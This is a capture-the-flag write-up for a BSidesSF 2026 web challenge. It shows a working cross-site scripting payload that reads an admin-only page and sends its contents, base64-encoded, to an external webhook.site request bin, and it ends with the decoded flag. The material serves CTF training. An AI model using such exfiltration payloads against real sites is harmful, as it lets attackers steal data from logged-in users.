# BSidesSF 2026 CTF - Web-tutorial-1 

Can you use XSS to steal the flag from the admin?

Flag Path:`/xss-one-flag`

![xss-site]()

### Actually there was hints like:
**Hint1:**
You'll need an XSS payload that bypasses this CSP:
```
default-src 'self' 'unsafe-inline';
script-src 'self' 'unsafe-inline';
connect-src *;
style-src-elem 'self' fonts.googleapis.com fonts.gstatic.com;
font-src 'self' fonts.gstatic.com fonts.googleapis.com
```
**Hint2:**
Notice that unsafe-inline is allowed. Start by trying:
```
<script>alert(1);</script>
```
**Hint3:**
Only the admin can view `/xss-one-flag`, so you need two requests.

One request should fetch the flag and the second should send it back to you.

Starter snippet:
```
var xhr = new XMLHttpRequest();
xhr.open('GET', '/xss-one-flag', true);
```
You can exfiltrate the result to a public request bin

## Solution

```
default-src 'self' 'unsafe-inline';
script-src 'self' <script>
var xhr = new XMLHttpRequest();
xhr.open('GET', '/xss-one-flag', true);
xhr.onload = function() {
  var exfil = new XMLHttpRequest();
  exfil.open('GET', 'https://webhook.site/dba9ec62-24f0-41d7-a9fa-443606bc8edd/?flag=' + btoa(xhr.responseText), true);
  exfil.send();
};
xhr.send();
</script>;
connect-src *;
style-src-elem 'self' fonts.googleapis.com fonts.gstatic.com;
font-src 'self' fonts.gstatic.com fonts.googleapis.com
```
And we got flag as a base64 encode, so after decode its:

`CTF{X55-tut0r1al-1s-back}`

*zsti_freaks — ZSTI Gliwice*
**kacper**
